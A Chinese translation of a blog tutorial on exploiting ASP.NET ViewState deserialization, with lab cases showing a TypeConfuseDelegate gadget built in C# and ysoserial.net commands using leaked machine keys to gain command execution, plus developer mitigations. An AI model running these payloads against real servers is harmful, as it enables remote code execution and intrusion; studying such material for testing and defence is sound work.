> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg)

前言
==

嗨，大家好：

欢迎访问这个有关. NET ViewState 反序列化的新博客文章。我想感谢 Subodh Pandey 为这篇博客文章和这项研究做出的贡献，没有他 (和他的研究)，我就无法深入了解这个主题。

在开始 ViewState 反序列化之前，让我们先看看一些与 ViewState 及其利用相关的关键术语。

**ViewState**：根据 TutorialsPoint 上的教程 (译者注：TutorialsPoint 是一个提供各种教程的网站) ：

视图状态是页面及其所有控件的状态。它由 ASP.NET 框架自动维护。

当一个页面被返回给客户端时，页面及其控件属性的变化将被确定，并存储在一个名为 `_VIEWSTATE` 的隐藏输入字段的值中。当页面再次向服务端发送请求时，`_VIEWSTATE` 字段将与 HTTP 请求一起发送到服务器。

（译者注：ViewState 是基于 web 表单的，当设置了 ViewState(`runat = "server"`) 后，会有一个隐藏字段`_ViewState`，这个字段会记录表单中其他控件的值，当表单被提交到服务器后，服务端判断某些字段需要用户重新填写，将表单重新返回给客户端，这时，可以通过`_ViewState`记录的值恢复上一次用户提交的内容，使得用户可以在之前表单的基础上修改，而不是重新填一遍表单的全部字段。）

**EventValidation**：

事件验证会检查 POST 请求中传入的值，确保这些值是已知且正确的值。如果运行时看到一个未知的值，则会抛出异常。

此参数还包含序列化数据。

一个例子

**ViewStateUserKey**：

是一个用户对一个页面的特定标识符，用于避免 CSRF 攻击。它可以这样设置：

```
void Page_Init (object sender, EventArgs e) <br style="box-sizing: border-box;">{<br style="box-sizing: border-box;"> ViewStateUserKey = Session.SessionID; <br style="box-sizing: border-box;">}<br style="box-sizing: border-box;">
```

一个例子

**Formatters**：Formatters（格式化器）被用于从一个表单向另一个表单转换数据。例如：BinaryFormatter 会以二进制格式将对象或整个连接对象图形序列化和反序列化。

**Gadgets**：当不受信任的数据被处理时，可能允许执行代码的类。.NET 的一些例子：`PSObject` 、`TextFormattingRunProperties` 和 `TypeConfuseDelegate` 。

ViewState 是如何使用的
================

ViewState 基本上由服务器生成，并以隐藏的表单字段 “_VIEWSTATE” 的形式发送给客户端，用于 “POST” 请求。当 Web 应用程序进行 POST 请求时，客户端将其发送到服务器。

ViewState 以序列化数据的形式出现，当客户端再次进行请求 (ViewState) 被发送到服务器时，将进行反序列化。ASP.NET 有各种序列化和反序列化库，称为 formatter ，它序列化对象到字节流，反之亦然(反序列化字节流到对象)，如 ObjectStateFormatter、LOSFormatter、BinaryFormatter 等。

ASP.NET 使用 LosFormatter 序列化 ViewState，并将其作为隐藏的表单字段发送到客户端。一旦序列化 ViewState 在 POST 请求期间被发送回服务器，它将使用 ObjectStateFormatter 进行反序列化。

为了使 ViewState 不受篡改，存在一个启用 ViewState MAC 的选项，通过设置一个值并在反序列化期间对 ViewState 的值进行完整性检查。

Web.config 文件中的 `<page enableViewStateMac="true" />` 。多种散列算法可以被选择，以便在 ViewState 中启用 MAC（消息身份验证代码）。

ASP.Net 还提供通过设置值加密 ViewState 的选项。

在 web.config 文件中的 `<page ViewStateEncryptionMode=”Always”/>`。

您可以在 ViewState 中选择使用不同的加密 / 验证算法。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJCK0mMic5iccbEJWPb0J0UzNDHQO7vqSz0GxlWJzc171XIpvvFVw4pBcQ/640?wx_fmt=png)

用于设置加密和验证算法的 IIS 管理器配置

借助一个示例，让我们看看序列化和反序列化在 .NET 中是如何生效的（类似于 ViewState 的工作原理）。

在这里，我们创建了一个单页网页的应用程序，该应用程序将简单地接受用户在文本区域的输入，单击按钮后将其显示在同一页面上。

我们编写了一个示例代码，让应用程序在加载时使用 LOSFormatter 创建序列化输入。这个序列化数据将被保存到文件中。当在应用程序中单击 _GO_ 按钮时，将从文件中读取这些数据，然后在 ObjectStateFormatter 的帮助下进行反序列化。

前端代码：Test.aspx

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="TestComment.aspx.cs" Inherits="TestComment" %><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"> <head runat="server">  <title></title> </head> <body>  <form id="form1" runat="server">   <asp:TextBox id="TextArea1" TextMode="multiline" Columns="50" Rows="5" runat="server" />   <asp:Button ID="Button1" runat="server" OnClick="Button1_Click" Text="GO" />   <br />   <br />   <br />   <asp:Label ID="Label1" runat="server"></asp:Label>  </form> </body></html>
```

后端代码：Test.aspx.cs

```
using System;using System.Collections.Generic;using System.Configuration;using System.Diagnostics;using System.IO;using System.Linq;using System.Reflection;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;public partial class TestComment : System.Web.UI.Page{ protected void Page_Load(object sender, EventArgs e) {  String cmd = “echo 123 > c:\\windows\\temp\\test.txt”;  Delegate da = new Comparison<string>(String.Compare);  Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);  IComparer<string> comp = Comparer<string>.Create(d);  SortedSet<string> set = new SortedSet<string>(comp);  set.Add(“cmd”);  set.Add(“/c “ + cmd);  FieldInfo fi = typeof(MulticastDelegate).GetField(“_invocationList”, BindingFlags.NonPublic | BindingFlags.Instance);  object[] invoke_list = d.GetInvocationList();  // Modify the invocation list to add Process::Start(string, string)  invoke_list[1] = new Func<string, string, Process>(Process.Start);  fi.SetValue(d, invoke_list);  MemoryStream stream = new MemoryStream();  Stream stream1 = new FileStream(“C:\\Windows\\Temp\\serialnet.txt”, FileMode.Create, FileAccess.Write);  //Serialization using LOSFormatter starts here  //The serialized output is base64 encoded which cannot be directly fed to ObjectStateFormatter for deserialization hence requires base64 decoding before deserialization   LosFormatter los = new LosFormatter();  los.Serialize(stream1, set);  stream1.Close(); } protected void Button1_Click(object sender, EventArgs e) {  string serialized_data = File.ReadAllText(@”C:\Windows\Temp\serialnet.txt”);  //Base64 decode the serialized data before deserialization  byte[] bytes = Convert.FromBase64String(serialized_data);  //Deserialization using ObjectStateFormatter starts here  ObjectStateFormatter osf = new ObjectStateFormatter();  string test = osf.Deserialize(Convert.ToBase64String(bytes)).ToString(); }}
```

现在，让我们看看代码在运行时的执行了什么。网页加载后，代码立即执行，并在 “C:\Windows\temp” 文件夹中创建一个名为 serialnet.txt 的文件，其中包含序列化数据，它执行以下代码中突出显示的操作：：

```
String cmd = “echo 123 > c:\\windows\\temp\\test.txt”;
```

以下是应用程序加载后的文件内容：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJMgr8XNwMIfQw6HicPPNsR713iaUjIg2z85vtX7KTyNkj9EELA5XWcnFQ/640?wx_fmt=png)

来自 LosFormatter 的序列化数据

一旦我们单击 _Go_ 按钮，提供的命令会在 TypeConfuseDelegate gadget 的帮助下执行。下面我们可以看到 test.txt 文件已在 Temp 目录中被创建：

![](https://mmbiz.qpic.cn/mmbiz_jpg/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJEUomFmgKTWlRtr9DMaPfGLMI9LPvsIjAlic0RySqP7tRq9NGvhQLLBA/640?wx_fmt=jpeg)文件 test.txt 被创建，内容是 “123”

这是一个简单的模拟，展示了 ViewState 序列化和反序列化如何在回退操作期间在 Web 应用程序中生效。

这也有助于确定不可信数据不应该被反序列化的事实。

现在我们已经了解了 ViewState 的基础知识及其如何生效，让我们将重点转移到 ViewState 不安全的反序列化上，以及这如何导致远程代码执行。

为了更好的理解，我们将了解各种测试用例，并实际查看每个案例。

为了生成 payload 来演示不安全的反序列化，我们将对所有测试用例使用 ysoserial.net 。

案例 1：目标 framework≤4.0(ViewState Mac 已禁用)
----------------------------------------

通过设置 `AspNetEnforceViewStateMac` 注册表项为零，可以完全禁用 ViewState MAC：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}<br style="box-sizing: border-box;">
```

如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJcIsxo8Ihjjia7a9ibaCOYnpgqnkXv3gGRhd4TnBTOMw7646c6wiassoVA/640?wx_fmt=png)

ViewState MAC 被从注册表禁用  

现在，准备完成，我们将进入利用阶段。为了该 demo，我们使用以下前端和后端代码：

前端代码：

```
<%@ Page Language=”C#” AutoEventWireup=”true” CodeFile=”hello.aspx.cs” Inherits=”hello” %><!DOCTYPE html><html xmlns=”http://www.w3.org/1999/xhtml"> <head runat=”server”>  <title></title> </head> <body>   <form id=”form1" runat=”server”>    <asp:TextBox id=”TextArea1" TextMode=”multiline” Columns=”50" Rows=”5" runat=”server” />    <asp:Button ID=”Button1" runat=”server” OnClick=”Button1_Click”    Text=”GO” class=”btn”/>    <br />    <asp:Label ID=”Label1" runat=”server”></asp:Label>   </form> </body></html>
```

后端代码：

```
using System;<br style="box-sizing: border-box;">using System.Collections.Generic;<br style="box-sizing: border-box;">using System.Web;<br style="box-sizing: border-box;">using System.Web.UI;<br style="box-sizing: border-box;">using System.Web.UI.WebControls;<br style="box-sizing: border-box;">using System.Text.RegularExpressions;<br style="box-sizing: border-box;">using System.Text;<br style="box-sizing: border-box;">using System.IO;<br style="box-sizing: border-box;"><br style="box-sizing: border-box;">public partial class hello : System.Web.UI.Page<br style="box-sizing: border-box;">{<br style="box-sizing: border-box;">  protected void Page_Load(object sender, EventArgs e)<br style="box-sizing: border-box;">  {<br style="box-sizing: border-box;">  }<br style="box-sizing: border-box;">  <br style="box-sizing: border-box;"> protected void Button1_Click(object sender, EventArgs e)<br style="box-sizing: border-box;">  {<br style="box-sizing: border-box;">   Label1.Text = TextArea1.Text.ToString();<br style="box-sizing: border-box;">  }<br style="box-sizing: border-box;">}<br style="box-sizing: border-box;">
```

我们在 IIS 中托管该应用程序，并使用 burpsuite 拦截应用程序的流量：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJicFqhfs50GNrLlYayxicQv8FicdlTlicYbAUzVM9RRcXhic3REps5GErLRA/640?wx_fmt=png)拦截应用程序流量

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJhprib0BsSicaRhImaL96AUBxORqyulGG5rqSg4ASCkFCQ37ricFSVQpDg/640?wx_fmt=png)ViewState MAC 被禁用

在上面的截图中可以看到，在更改注册表项后，ViewState MAC 已被禁用。

现在，我们可以使用 ysoserial.net 创建一个序列化 payload ，如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJcbicJRO5wwcJ71Sqp0EibZphpb2CUS3h5mENn3gZr9nTJAI73S42HAZw/640?wx_fmt=png)Ysoserial payload 的生成

上面用来生成 payload 的命令是：

```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "echo 123 > C:\Windows\temp\test.txt" > payload_when_mac_disabled
```

在 HTTP POST 请求中的 ViewState 参数中使用上述生成的 payload，我们可以观察 payload 的执行如下：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJfm4n1eS0C0yWl3bTAYS9QCjVia3v8UM56UR2rEV6nSicSibJW8ag2GAJQ/640?wx_fmt=png)ViewState 参数的值被使用 ysoserial 生成的 payload 替换

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJ4zKNJXMTicZibo6AkGicR7CMAadH8sRbV0o7g4PbSUey0UIEy2g9icJTww/640?wx_fmt=png)文件 test.txt 被使用内容 “123” 创建

案例 2：当从 HTTP 请求中删除 ViewState 时
------------------------------

在本案例中，我们将介绍开发人员试图将 ViewState 从 HTTP 请求中删除的场景。为了演示，我们重用了上述示例中的前端代码，并将后端代码修改为：

后端代码：

```
using System;<br style="box-sizing: border-box;">using System.Collections.Generic;<br style="box-sizing: border-box;">using System.Web;<br style="box-sizing: border-box;">using System.Web.UI;<br style="box-sizing: border-box;">using System.Web.UI.WebControls;<br style="box-sizing: border-box;">using System.Text.RegularExpressions;<br style="box-sizing: border-box;">using System.Text;<br style="box-sizing: border-box;">using System.IO;<br style="box-sizing: border-box;"><br style="box-sizing: border-box;">public class BasePage : System.Web.UI.Page<br style="box-sizing: border-box;">{<br style="box-sizing: border-box;">  protected override void Render(HtmlTextWriter writer)<br style="box-sizing: border-box;">  {<br style="box-sizing: border-box;">   StringBuilder sb = new StringBuilder();<br style="box-sizing: border-box;">   StringWriter sw = new StringWriter(sb);<br style="box-sizing: border-box;">   HtmlTextWriter hWriter = new HtmlTextWriter(sw);<br style="box-sizing: border-box;">   base.Render(hWriter);<br style="box-sizing: border-box;">   string html = sb.ToString();<br style="box-sizing: border-box;">   html = Regex.Replace(html, “<input[^>]*id=\”(__VIEWSTATE)\”[^>]*>”, string.Empty, RegexOptions.IgnoreCase);<br style="box-sizing: border-box;">   writer.Write(html);<br style="box-sizing: border-box;">  }<br style="box-sizing: border-box;">}<br style="box-sizing: border-box;"><br style="box-sizing: border-box;">public partial class hello : BasePage<br style="box-sizing: border-box;">{<br style="box-sizing: border-box;">  protected void Page_Load(object sender, EventArgs e)<br style="box-sizing: border-box;">  {<br style="box-sizing: border-box;">  }<br style="box-sizing: border-box;">  <br style="box-sizing: border-box;">  protected void Button1_Click(object sender, EventArgs e)<br style="box-sizing: border-box;">  {<br style="box-sizing: border-box;">   Label1.Text = TextArea1.Text.ToString();<br style="box-sizing: border-box;">  }<br style="box-sizing: border-box;">}<br style="box-sizing: border-box;">
```

当我们在 IIS 上托管该代码，我们将观察到 POST 请求不再发送 ViewState 参数。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJSuH8P3gdppmkic0DTD6MvsHsfbhM6MKxtmnfE1DibQuR4OoDCzwTicZZg/640?wx_fmt=png)在 HTTP POST 请求中，不再有 ViewState 参数

或许可以假设，如果没有 ViewState ，它们的实现是安全的，不会因 ViewState 反序列化而产生任何潜在的漏洞。

然而，事实并非如此。如果我们向请求包中添加 ViewState 参数并发送使用 ysoserial 创建的序列化 payload ，我们仍将能够实现如案例 1 所示的代码执行。

案例 3：目标 framework≤4.0(启用了 ViewState Mac)
----------------------------------------

我们可以通过更改设置，在特定页面或整个应用程序中启用 ViewState MAC 。

为了对特定页面启用 ViewState MAC ，我们需要对特定的 aspx 文件进行以下更改：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```

我们还可以通过在 web.config 文件中设置该项使整个应用程序中都启用 ViewState MAC ，如下所示：

```
<?xml version=”1.0" encoding=”UTF-8"?><configuration><system.web><customErrors mode=”Off” /> <machineKey validation=”SHA1" validationKey=”C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" /> <pages enableViewStateMac=”true” /></system.web></configuration>
```

现在，假设已经为 ViewState 启用 MAC（消息身份验证），并且由于存在类似本地文件读取、XXE 等漏洞，我们可以访问 web.config 文件，获取到上述的验证密钥和算法等设置，接着我们通过（向 ysoserial.net ）提供获取到的配置作为参数，生成 payload 。

为了演示 demo ，我们使用了以下代码作为示例应用程序，并假设攻击者由于任意文件读取漏洞能够访问 web.config 文件：

前端代码：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" %><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head runat="server">    <title></title></head><body>    <form id="form1" runat="server">        <asp:TextBox id="TextArea1" TextMode="multiline" Columns="50" Rows="5" runat="server" />        <asp:Button ID="Button1" runat="server" OnClick="Button1_Click"                 Text="GO" class="btn"/>  <br />        <asp:Label ID="Label1" runat="server"></asp:Label>    </form></body></html>
```

后端代码：

```
using System;<br style="box-sizing: border-box;">using System.Collections.Generic;<br style="box-sizing: border-box;">using System.Web;<br style="box-sizing: border-box;">using System.Web.UI;<br style="box-sizing: border-box;">using System.Web.UI.WebControls;<br style="box-sizing: border-box;">using System.Text.RegularExpressions;<br style="box-sizing: border-box;">using System.Text;<br style="box-sizing: border-box;">using System.IO;<br style="box-sizing: border-box;">public partial class hello : System.Web.UI.Page<br style="box-sizing: border-box;">{<br style="box-sizing: border-box;">    protected void Page_Load(object sender, EventArgs e)<br style="box-sizing: border-box;">    {<br style="box-sizing: border-box;">}<br style="box-sizing: border-box;"> protected override void OnInit(EventArgs e)<br style="box-sizing: border-box;">    {<br style="box-sizing: border-box;">        base.OnInit(e);<br style="box-sizing: border-box;"> }<br style="box-sizing: border-box;">    protected void Button1_Click(object sender, EventArgs e)<br style="box-sizing: border-box;">    {<br style="box-sizing: border-box;">        Label1.Text = TextArea1.Text.ToString();<br style="box-sizing: border-box;">    }<br style="box-sizing: border-box;">}<br style="box-sizing: border-box;">
```

Web.Config:

```
<?xml version=”1.0" encoding=”UTF-8"?><configuration><system.web><customErrors mode=”Off” /> <machineKey validation=”SHA1" validationKey=”C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" /> <pages enableViewStateMac=”true” /></system.web></configuration>
```

现在，在 IIS 中托管此应用程序时，我们试图使用 burpsuite 拦截应用程序的功能，如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJW6FvCibRBvmZoIRe9PHzVrBeB4QBaJEeBJlLhEE6u30LkxJ2Hh6cVyA/640?wx_fmt=png)拦截生成的请求

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJlt4zQjA7oVfEZRMqbrdB7Buia3y6VUicPBAfkku1T2X6Nl3jo4wOadsw/640?wx_fmt=png)启用了 ViewState MAC

现在，我们可以看到 ViewState MAC 已经被启用。

如果我们注意到上面的 POST 请求，我们可以看到请求中没有 `“_VIEWSTATEGENERATOR”` 参数。在这种情况下，我们需要将 _apppath_ 和 _path_ 变量作为 ysoserial 的参数。然而，如果我们在 HTTP 请求中添加 `_VIEWSTATEGENERATOR` 参数，我们可以直接将其值提供给 ysoserial 以生成 payload 。

让我们使用 ysoserial.net 创建 payload ，并提供 _验证密钥_ 和 _算法_ 作为参数以及 _apppath_ 和 _path_。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJMo6EHwibeVesjGlgkaGvq8ASAZrfaXAsWO2sI9LiaWJNxWtqKqlZgkDg/640?wx_fmt=png)使用 Ysoserial 生成序列化 payload

在这里，参数 “p” 代表插件，“g”代表 gadgets，“c”代表在服务器上运行的命令，“validationkey”和 “validationalg” 是从 web.config 中获取的值。

让我们将生成的 payload 作为 ViewState 的值使用，如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJ40qMaAdpd8bZ90BiaENgSiaZicdDLuvbE98k6ouicZENaRz1DmE4vusJWg/640?wx_fmt=png)ViewState 被 ysoserial payload 替换

一旦请求被处理，我们将收到一个错误。然而，我们可以看到 payload 被执行，内容为 “123” 的文件 test.txt 被成功创建。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJ4zKNJXMTicZibo6AkGicR7CMAadH8sRbV0o7g4PbSUey0UIEy2g9icJTww/640?wx_fmt=png)文件 test.txt 在提交请求后创建

案例 4：目标 framework≤4.0(为 ViewState 启用加密)
---------------------------------------

在 .NET 4.5 之前，ASP.NET 可以接受来自用户的未加密的 `__VIEWSTATE` 参数，即使 ViewStateEncryptionMode 已设置为 _Always_。ASP.NET 仅检查请求中是否存在`__VIEWSTATEENCRYPTED` 参数。如果删除此参数并发送未加密的有效负载，它仍将被处理。

案例 5：目标 framework≥.NET 4.5
--------------------------

我们可以通过在 web.config 文件中指定以下参数来强制使用 ASP.NET 框架。

```
<httpRuntime targetFramework=”4.5" />
```

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJeIibmefyNjEv6wQOicNf1ia8XbWzy3g5hbtHe4BiapM7B424xB37qgJx2w/640?wx_fmt=png)system.web 中的目标 framework

或者，也可以通过在 web.config 文件中将 machineKey 参数指定为下述选项来完成。

```
compatibilityMode=”Framework45"
```

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJDOiaAE7qgiaWznVapQrQwTGYUUXcQiczKZZLl0JF6NmmpGlFWE7vh8WjA/640?wx_fmt=png)具有兼容模式的 machineKey

对于 ASP.NET framework ≥ 4.5，我们需要向 ysoserial payload 生成器提供 _解密算法_ 和 _解密密钥_，如下所示：

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c “echo 123 > c:\windows\temp\test.txt” --path=”/site/test.aspx/” --apppath=”/directory” — decryptionalg=”AES” --decryptionkey=”EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39" --validationalg=”SHA1" --validationkey=”B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3"
```

上面的 _path_ 和 _apppath_ 参数可以通过一些调试来确定。为了 demo 演示，我们将使用以下代码。

前端代码：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="test.aspx.cs" Inherits="test" %><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head runat="server">    <title></title></head><body>    <form id="form1" runat="server">        <asp:TextBox id="TextArea1" TextMode="multiline" Columns="50" Rows="5" runat="server" />        <asp:Button ID="Button1" runat="server" OnClick="Button1_Click"                 Text="GO" class="btn"/>  <br />        <asp:Label ID="Label1" runat="server"></asp:Label>    </form></body></html>
```

后端代码：

```
using System;using System.Collections.Generic;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Text.RegularExpressions;using System.Text;using System.IO;public partial class test : System.Web.UI.Page{    protected void Page_Load(object sender, EventArgs e)    {    }protected override void OnInit(EventArgs e)    {        base.OnInit(e); }    protected void Button1_Click(object sender, EventArgs e)    {        Label1.Text = TextArea1.Text.ToString();    }}
```

当单击用户界面中的 _Go_ 按钮时，将发送以下请求。请注意，`__VIEWSTATEGENERATOR` 的值目前为 **75BBA7D6** 。借助 ysoserial payload 生成器的 islegacy 和 isdebug 开关，我们可以尝试猜测 _path_ 和 _apppath_ 的值。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJHMs10Tagic76GdHc8NcUyBgW0qBvJl1IN4zCoBibZ3M3xv2yWIP3zq7Q/640?wx_fmt=png)点击 Go 时发送的正常请求

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJhOORYyzQIwzjTko5UaUoeHyNVF5icNBNqL363kOdWIu1DvoYl1dVFYQ/640?wx_fmt=png)用于上述请求的加密的 ViewState

在 ysoserial 工具中，生成一个如下所示的具有不同的 _path_ 和 _apppath_ 参数值的 payload 。一旦`__VIEWSTATEGENERATOR` 的生成值与 Web 应用程序请求中的值匹配，可以得出结论，我们获得了正确的值。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJKtRTfKMiar2GSxpBNwXWKXbqia6yt7wycDfKpZgDbJMb6oU6LkPe9u8g/640?wx_fmt=png)确定 path 和 apppath

在上面的屏幕截图中，第二个请求为我们提供了 `__VIEWSTATEGENERATOR` 参数的正确值。因此，我们可以使用 _path_ 和 _apppath_ 的值来生成有效的 payload 。现在的命令是：

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39" --validationalg="SHA1" --validationkey="B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3"
```

请注意，我们还需要对生成的 payload 进行 URL 编码，以便能够在我们的示例中使用它。在上述请求中使用生成的 payload 的 URL 编码值替换 `__VIEWSTATE` 的值后，我们的 payload 将执行。这可以观察到如下：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJ9L8QI4w7TRBUxE8Vc7cNqCxPhovLFXQ24oPg5BwH0ppXhBIGUPOyqg/640?wx_fmt=png)文件 test.txt 在提交请求后被创建

案例 6: 使用 ViewStateUserKey
-------------------------

如本文开头所述，ViewStateUserKey 属性可用于抵御 CSRF 攻击。如果应用程序中已经定义了这样的密钥，并且我们试图使用到目前为止讨论的方法生成 ViewState payload，则应用程序将不会处理 payload 。这里，我们需要将另一个参数传递给 ysoserial ViewState 生成器，如下所示：

```
ysoserial.net-master\ysoserial.net-master\ysoserial\bin\Debug>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39" --validationalg="SHA1" --validationkey="B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3" --viewstateuserkey="randomstringdefinedintheserver"
```

（译者注：`--viewstateuserkey="randomstringdefinedintheserver"` 在原文中存在加粗，本文由于使用 markdown 编辑，无法在代码格式中进行加粗）

下面是我们用来演示这个例子的后端代码：

后端代码：

```
using System;using System.Collections.Generic;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Text.RegularExpressions;using System.Text;using System.IO;public partial class test : System.Web.UI.Page{ void Page_Init (object sender, EventArgs e)  {    ViewStateUserKey = "randomstringdefinedintheserver";   }    protected void Page_Load(object sender, EventArgs e)    {    }protected override void OnInit(EventArgs e)    {        base.OnInit(e); }    protected void Button1_Click(object sender, EventArgs e)    {        Label1.Text = TextArea1.Text.ToString();    }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJs2CvNA6qvoe5GR2NYb83LqhFgicTuiaqDnPHjLPF3VAnWTRXkFUKNtNA/640?wx_fmt=png)

文件 test.txt 在提交请求后创建  

开发人员应采取什么措施来阻止漏洞利用？
-------------------

1.  升级 ASP.NET 框架，以便无法禁用 MAC 验证。
    
2.  不要硬编码 web.config 文件中的解密和验证密钥。相反，依赖于 IIS 的 “运行时自动生成” 功能。即使 **web.config** 文件被任何其他漏洞（例如读取的本地文件）所获取，攻击者也无法检索出创建 payload 所需的密钥值。
    
    例如：![](https://mmbiz.qpic.cn/mmbiz_jpg/PUubqXlrzBTMIXFdYEtxcHkXKQlmFajJicdwzD4iakMRStt1WbQejd7zk8I9ibK4DBrGgvZUqnv6Viap3YMTSOr8Zw/640?wx_fmt=jpeg)
    

自动生成验证解密密钥配置

   或者，

   加密 machine key 的内容，使得泄露的 web.config 文件不会显示 machineKey 参数中的值。一个例子。

3. 重新生成任何 已泄露 / 先前泄露 的 验证 / 解密 密钥。

4. 不要在应用程序中的 web.config 中粘贴能够在线找到的 machineKey 。

参考
--

1.  https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
    
2.  https://github.com/pwntester/ysoserial.net
    
3.  https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
    
4.  https://www.tutorialspoint.com/asp.net/asp.net_managing_state.htm
    
5.  https://odetocode.com/blogs/scott/archive/2006/03/20/asp-net-event-validation-and-invalid-callback-or-postback-argument.aspx
    
6.  https://blogs.objectsharp.com/post/2010/04/08/ViewStateUserKey-ValidateAntiForgeryToken-and-the-Security-Development-Lifecycle.aspx
    

如有错误，敬请指正。

原文地址：https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817 （感谢 @Ricter Z 选题）

end

  

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组 IOT + 工控 + 样本分析 长期招新  

欢迎联系 admin@chamd5.org

  
  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBR8nk7RR7HefBINILy4PClwoEMzGCJovye9KIsEjCKwxlqcSFsGJSv3OtYIjmKpXzVyfzlqSicWwxQ/640?wx_fmt=jpeg)